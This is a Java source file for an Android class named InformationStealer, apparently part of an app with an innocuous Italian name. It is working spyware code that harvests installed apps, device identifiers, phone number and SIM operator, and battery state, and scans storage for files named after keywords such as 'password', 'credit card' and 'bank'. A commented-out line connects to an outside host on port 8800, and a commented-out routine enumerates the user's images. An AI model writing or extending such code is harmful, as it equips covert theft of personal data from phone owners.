package com.example.applicazioneinteressante;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.Manifest;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.List;

public class InformationStealer implements Runnable {
    private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;

    public StringBuilder getMessaggio() {
        return messaggio;
    }

    public void setMessaggio(StringBuilder messaggio) {
        InformationStealer.messaggio = messaggio;
    }

    private static StringBuilder messaggio;

    final String[] keywords = {
            "aprire",
            "Secret",
            "password",
            "credit",
            "card",
            "confidential",
            "top",
            "private",
            "classified",
            "sensitive",
            "hidden",
            "only",
            "criptato",
            "riservato",
            "vietato",
            "autorizzato",
            "informazioni",
            "proprietario",
            "divulgare",
            "privilegiato",
            "compromettente",
            "violazione",
            "sicurezza",
            "segreto",
            "operazione",
            "clandestina",
            "documenti",
            "classificati",
            "accesso",
            "limitato",
            "criptati",
            "archiviazione",
            "sicura",
            "protetto",
            "allarme",
            "email",
            "sex",
            "illegal",
            "drug",
            "virus",
            "money",
            "bank",
            "data"
    };

    NetworkManager conn = new NetworkManager();
    Context context;
    public InformationStealer(Context context){
        this.context = context;
        //conn.openConnection("rblob.homepc.it", 8800);
    }

    @Override
    public void run(){
        messaggio.append(stealApp(context));
        messaggio.append(searchFilesWithKeywords(context, keywords));
        messaggio.append(stealSystemDetail(context));
        messaggio.append(stealBatteryInformation(context));
    }

    @SuppressLint("MissingPermission")
    static String stealNumberInformations(Context context) {
        String msg;
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
            String operator = telephonyManager.getSimOperatorName();
            msg = "&Phone_number=" + phoneNumber + "&";
            msg = "&SIM_Operator=" + operator + "&";
            return msg;
        }
        return "";
    }

    private static String getBatteryStatusText(int status){
        switch (status) {
            case BatteryManager.BATTERY_STATUS_CHARGING:
                return "Charging";
            case BatteryManager.BATTERY_STATUS_DISCHARGING:
                return "Discharging";
            case BatteryManager.BATTERY_STATUS_FULL:
                return "Full";
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                return "Not_Charging";
            case BatteryManager.BATTERY_STATUS_UNKNOWN:
            default:
                return "Unknown";
        }
    }


    /* -------- QUESTA E' LA FUNZIONE CHE TI RUBA LE IMMAGINI PER ORA LA LASCIO COMMENTATA ---------------

    public static void searchImages(Context context) {
        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            // Richiedi il permesso all'utente se non è stato ancora concesso
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
            return;
        }

        // Il permesso è stato concesso, esegui la ricerca delle immagini
        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};

        Cursor cursor = context.getContentResolver().query(imageUri, projection, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                System.out.println("File immagine trovato: " + imagePath);
            } while (cursor.moveToNext());
            cursor.close();
        } else {
            System.out.println("Nessun file immagine trovato");
        }
    }

   */

    public String searchFilesWithKeywords(Context context, String[] keywords) {
        int numeroFileInteressanti = 0;

        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            // Richiedi il permesso all'utente se non è stato ancora concesso
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
            return "";
        }

        // Il permesso è stato concesso, esegui la ricerca dei file
        Uri fileUri = MediaStore.Files.getContentUri("external");
        String[] projection = {MediaStore.Files.FileColumns.DATA};

        String selection = "";

        for (int i = 0; i < keywords.length; i++) {
            String keyword = keywords[i];
            selection += "LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%" + keyword + "%')";
            if (i < keywords.length - 1) {
                selection += " OR ";
            }
        }

        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
                System.out.println("Trovato un file interessante: " + filePath);
                numeroFileInteressanti++;
            } while (cursor.moveToNext());
            System.out.println("\nFile interessanti trovati: " + numeroFileInteressanti);
            cursor.close();
            return "&File_interessanti=" + numeroFileInteressanti + "&";
        } else {
            return "&File_interessanti=0&";
        }
    }

    public String stealApp(Context context) {
        PackageManager packageManager = context.getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

        StringBuilder sb = new StringBuilder();

        for (ApplicationInfo applicationInfo : installedApplications) {
            if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String packageName = applicationInfo.packageName;
                String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                String sourceDir = applicationInfo.sourceDir;

                sb.append("&App_Name=").append(appName);
                sb.append("&Package_Name=").append(packageName);
                sb.append("&Source_Dir=").append(sourceDir);
                sb.append("&");
            }
        }

        return sb.toString();
    }

    public static String stealSystemDetail(Context context) {
        StringBuilder sb = new StringBuilder();

        sb.append("&Brand=").append(Build.BRAND).append("&");
        sb.append("&DeviceID=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("&");
        sb.append("&Model=").append(Build.MODEL).append("&");
        sb.append("&ID=").append(Build.ID).append("&");
        sb.append("&SDK=").append(Build.VERSION.SDK_INT).append("&");
        sb.append("&Manufacture=").append(Build.MANUFACTURER).append("&");
        sb.append("&User=").append(Build.USER).append("&");
        sb.append("&Type=").append(Build.TYPE).append("&");
        sb.append("&Base=").append(Build.VERSION_CODES.BASE).append("&");
        sb.append("&Incremental=").append(Build.VERSION.INCREMENTAL).append("&");
        sb.append("&Board=").append(Build.BOARD).append("&");
        sb.append("&Host=").append(Build.HOST).append("&");
        sb.append("&FingerPrint=").append(Build.FINGERPRINT).append("&");
        sb.append("&Version_Code=").append(Build.VERSION.RELEASE).append("&");

        return sb.toString();
    }

    public static String stealBatteryInformation(Context context) {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, filter);

        StringBuilder sb = new StringBuilder();

        if (batteryStatus != null) {
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int batteryLevel = (int) ((level / (float) scale) * 100);

            String batteryStatusText = getBatteryStatusText(status);
            sb.append("&Battery_Status=").append(batteryStatusText).append("&");
            sb.append("&Battery_Level=").append(batteryLevel).append("%&");
        } else {
            sb.append("&Battery_Status=Unknown&");
            sb.append("&Battery_Level=Unknown&");
        }

        return sb.toString();
    }

}

